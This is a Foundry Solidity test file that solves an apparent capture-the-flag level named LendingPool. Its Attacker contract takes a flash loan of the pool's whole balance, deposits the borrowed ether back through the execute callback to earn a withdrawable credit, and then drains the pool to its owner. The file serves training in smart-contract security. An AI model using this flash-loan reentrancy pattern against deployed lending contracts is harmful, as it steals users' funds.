// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/08_LendingPool/LendingPool.sol";

// forge test --match-contract LendingPoolTest -vvvv
contract LendingPoolTest is BaseTest {
    LendingPool instance;

    function setUp() public override {
        super.setUp();
        instance = new LendingPool{value: 0.1 ether}();
    }

    function testExploitLevel() public {
        Attacker attacker = new Attacker(address(instance));
        attacker.attack();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

contract Attacker is IFlashLoanReceiver {
    LendingPool pool;
    address payable owner;

    constructor(address _poolAddress) {
        pool = LendingPool(_poolAddress);
        owner = payable(msg.sender);
    }

    function attack() public {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);

        pool.withdraw();

        owner.transfer(address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();

    }
    receive() external payable {}
}
